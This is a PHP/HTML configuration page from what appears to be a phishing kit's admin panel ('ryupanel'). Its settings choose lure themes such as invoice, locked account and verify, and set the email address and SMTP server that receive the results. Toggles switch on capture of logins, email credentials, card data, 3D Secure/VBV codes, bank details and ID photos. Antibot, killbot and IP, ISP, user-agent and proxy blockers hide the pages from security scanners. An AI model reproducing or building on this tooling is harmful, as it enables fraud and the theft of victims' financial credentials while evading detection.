<script>
    function memek()
    {
        var metot=document.getElementById('send_method').value;
        if(metot == 'smtp')
        {
            document.getElementById('smtp_setting').style.display='block';
        }else{
            document.getElementById('smtp_setting').style.display='none';
        }
    }
</script>

<form method="post" action="?c=ryupanel&a=config">
<div class="w3-content w3-justify w3-text-grey w3-padding-64" id="ryu_config">
    <h2 class="w3-text-light-grey">Configuration</h2>
    <hr style="width:200px" class="w3-opacity">
    <p>You can edit application config here, u need remove your session / logout if wanna testing new configuration.   </p>
  <?php

function input($name,$value)
{
    return '
    <input class="w3-input w3-border" name="'.$name.'" value="'.$value.'" type="text" placeholder="'.$name.'">';
}

function yesno($name,$checked)
{
    $x= '<div class="w3-row-padding">';
    if($checked == 1)
    {
        $x.= '<div class="w3-half"><input class="w3-radio" type="radio" name="'.$name.'" value="1" checked>
        <label>YES</label></div><div class="w3-half"> <input class="w3-radio" type="radio" name="'.$name.'" value="0">
        <label>NO</label></div>';
    }else{
        $x.= '<div class="w3-half"><input class="w3-radio" type="radio" name="'.$name.'" value="1" >
        <label>YES</label></div><div class="w3-half"> <input class="w3-radio" type="radio" name="'.$name.'" value="0" checked>
        <label>NO</label></div>';
    }
    $x.= '</div>';
    return $x;
}

?>
    <div class="w3-row-padding" style='color:#eee'>
       <div class="w3-half">
       <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>EMAIL RESULT</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=input('email_result',CONFIG['app']['email_result']);?>
               </div>
           </div>
        
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>PARAMETER</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=input('parameter',CONFIG['app']['parameter']);?>
               </div>
           </div>
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>DEFAULT LANGUAGE</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                   <select name="default_lang" class="w3-input">
                        <?php
                        $lang_list = ROOT_PATH.'Core/languages/';
                        $langes = scandir($lang_list);
                        $locale = new RyuLocale;
                        foreach($langes as $langg){
                            if(!preg_match("/ryujin/",$langg))continue;
                            $lang_code = explode("-",$langg);
                            $lang_code = $lang_code[0];
                            $langto = $locale->langCode_toName($lang_code);
                            if($lang_code == CONFIG['app']['default_lang']){
                                
                        echo '<option value="'.$lang_code.'" selected>'.strtoupper($langto).'</option>';
                            }else{
                        echo '<option value="'.$lang_code.'" >'.strtoupper($langto).'</option>';
                            }
                        }
                        ?>
                   </select>
               </div>
           </div>
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>CASE </b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <select name="case" id="case" class="w3-input">
                        <?php
                        $cases=  ['invoice','locked','verify'];
                        foreach($cases as $case){
                            if($case == CONFIG['app']['case']){
                        echo '<option value="'.$case.'" selected>'.strtoupper($case).'</option>';
                            }else{
                        echo '<option value="'.$case.'" >'.strtoupper($case).'</option>';
                            }
                        }
                        ?>
                    </select>
               </div>
           </div>
           
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>PAGE BLOCKED </b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <select name="blocked_page" id="case" class="w3-input">
                        <?php
                        $blockes=  ['403' => '403 Forbidden','tcp' => 'TCP Network error','suspend' => 'Account Suspended'];
                        foreach($blockes as $block=>$desc){
                            if($block == CONFIG['app']['blocked_page']){
                        echo '<option value="'.$block.'" selected>'.strtoupper($desc).'</option>';
                            }else{
                        echo '<option value="'.$block.'" >'.strtoupper($desc).'</option>';
                            }
                        }
                        ?>
                    </select>
               </div>
           </div>
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>API ANTIBOT</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=input('antibot',CONFIG['app']['antibot']);?>
               </div>
           </div>
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>API IPSTACK</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=input('ipstack',CONFIG['app']['ipstack']);?>
               </div>
           </div>
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>API KILLBOT</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=input('killbot',CONFIG['app']['killbot']);?>
               </div>
           </div>
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>SEND METHOD</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <select name="send_method" id="send_method" onchange="memek()" class="w3-input">
                        <?php
                        $semd_memthod = ['smtp','mail'];
                        foreach($semd_memthod as $memtot)
                        {
                            if(CONFIG['app']['send_method'] == $memtot)
                            {
                                echo '<option value="'.$memtot.'" selected>'.strtoupper($memtot).'</option>';
                            }else{
                                echo '<option value="'.$memtot.'" >'.strtoupper($memtot).'</option>';
                            }
                        }
                        ?>
                    </select>
               </div>
           </div>
        
        
           
       </div>
       <div class="w3-half">
       <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>ONE TIME ACCESS</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=yesno('one_time',CONFIG['app']['one_time']);?>
               </div>
           </div>   
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>SEND LOGIN</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=yesno('send_login',CONFIG['app']['send_login']);?>
               </div>
           </div>   
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>DOUBLE CARD</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=yesno('double_card',CONFIG['app']['double_card']);?>
               </div>
           </div> 
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>GET 3dSecure / VBV</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=yesno('3dsecure',CONFIG['app']['3dsecure']);?>
               </div>
           </div>   
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>GET PHOTO </b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=yesno('pap',CONFIG['app']['pap']);?>
               </div>
           </div>   
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>GET EMAIL </b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=yesno('email_login',CONFIG['app']['email_login']);?>
               </div>
           </div>   
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>GET BANK</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=yesno('bank',CONFIG['app']['bank']);?>
               </div>
           </div>
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>LOCK LANGUAGE ( <font color=lime><?=CONFIG['app']['default_lang'];?></font> )</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=yesno('lock_lang',CONFIG['app']['lock_lang']);?>
               </div>
           </div> 

           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>BLOCKER IPs</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=yesno('ip',CONFIG['app']['ip']);?>
               </div>
           </div> 
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>BLOCKER USERAGENT</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=yesno('agent',CONFIG['app']['agent']);?>
               </div>
           </div> 
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>BLOCKER HOSTNAME</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=yesno('host',CONFIG['app']['host']);?>
               </div>
           </div> 
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>BLOCKER ISP</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=yesno('isp',CONFIG['app']['isp']);?>
               </div>
           </div> 
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>BLOCKER PROXY</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=yesno('proxy',CONFIG['app']['proxy']);?>
               </div>
           </div> 
    </div>
    <?php
    if(CONFIG['app']['send_method'] == 'smtp')
    {
        $display = 'block';
    }else{
        $display='none';
    }
    ?>
    <div class="w3-col w3-container w3-grey " style="display:<?=$display;?>" id="smtp_setting">
        <h3 class="w3-margin">SMTP SETTINGS</h3><br>
    <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>SMTP HOSTNAME</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=input('smtp_hostname',CONFIG['app']['smtp_hostname']);?>
               </div>
           </div>
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>SMTP PORT</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=input('smtp_port',CONFIG['app']['smtp_port']);?>
               </div>
           </div>
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>SMTP USERNAME</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=input('smtp_username',CONFIG['app']['smtp_username']);?>
               </div>
           </div>
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>SMTP PASSWORD</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=input('smtp_password',CONFIG['app']['smtp_password']);?>
               </div>
           </div>
           <div class="w3-row-padding">
               <div class="w3-half w3-margin-bottom">
                   <b>SMTP SECURE</b>
               </div>
               <div class="w3-half w3-margin-bottom">
                    <?=input('smtp_secure',CONFIG['app']['smtp_secure']);?>
               </div>
           </div>
           <div class="w3-row-padding">
        <a href="?c=ryupanel&a=smtptest" class="w3-btn w3-block w3-orange w3-margin-top">TEST SMTP SEND TO EMAIL RESULT</a>
        </div>
    </div>

     </div>
     <input type="submit" name="submit" class="w3-btn w3-block w3-green w3-margin-top" value="SAVE ALL SETTING !">
 
  <!-- End About Section -->
  </div>
                    </form>